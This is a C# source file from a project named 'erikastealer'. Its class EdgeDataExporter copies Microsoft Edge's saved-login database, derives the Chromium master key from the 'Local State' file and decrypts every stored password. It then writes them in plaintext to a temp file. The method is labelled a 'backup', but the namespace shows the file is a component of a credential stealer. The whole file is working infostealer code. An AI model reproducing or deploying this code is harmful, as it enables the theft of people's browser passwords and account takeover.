namespace erikastealer
{
    using erikastealer.Exporters;
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.IO.Compression;
    using System.Text;
    using System.Text.Json;
    using System.Data.SQLite;
    using System.Security.Cryptography;
    using System.Linq;
    using System.Xml.Linq;
    using Org.BouncyCastle.Crypto.Engines;
    using Org.BouncyCastle.Crypto.Modes;
    using Org.BouncyCastle.Crypto.Parameters;
    using erikastealer.Helpers;

    public class EdgeDataExporter : IExporter
    {
        private static readonly string EdgeProfilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Edge", "User Data", "Default", "Login Data");

        private static readonly string LocalStatePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Edge", "User Data", "Local State");


        public string CreateBackup()
        {
            if (!File.Exists(EdgeProfilePath))
                throw new FileNotFoundException("Nie znaleziono bazy danych Edge", EdgeProfilePath);

            string tempDbPath = Path.Combine(Path.GetTempPath(), "EdgeLoginData.db");
            File.Copy(EdgeProfilePath, tempDbPath, true);

            
            byte[] masterKey = DPAPI.GetChromiumMasterKey(LocalStatePath);

            List<DPAPI.PasswordEntry> passwords = DPAPI.ExtractPasswords(tempDbPath, masterKey);

            string backupFile = Path.Combine(Path.GetTempPath(), "edge_passwords.txt");
            File.WriteAllLines(backupFile, passwords.Select(x => x.ToString()).ToArray());

            File.Delete(tempDbPath);
            return backupFile;
          
        }

 


 


    }
}
